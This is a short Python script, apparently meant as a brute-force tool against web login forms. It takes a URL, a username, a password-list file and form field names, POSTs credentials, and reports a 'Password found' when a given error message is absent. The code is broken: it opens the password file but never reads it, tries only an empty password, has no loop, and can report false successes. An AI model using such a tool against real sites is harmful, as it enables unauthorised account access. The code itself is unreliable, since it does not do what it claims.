import requests

website = input("URL: ")
username = input("Username: ")
pass_file = input("Password File: ")
file = open(pass_file, "r")
password = ""
password = password.strip("\n")

userform = input("Username data name in form: ")
passform = input("Password data name in form: ")
data = {userform:username, passform:password, "":'submit'}
send_data_url = requests.post(website, data=data)
errormsg = input("Error message on wrong username or password: ")

if errormsg in str(send_data_url.content):
    print("[*] Attempting password: %s" % password)
else:
    print("[*] Password found: %s " % password)
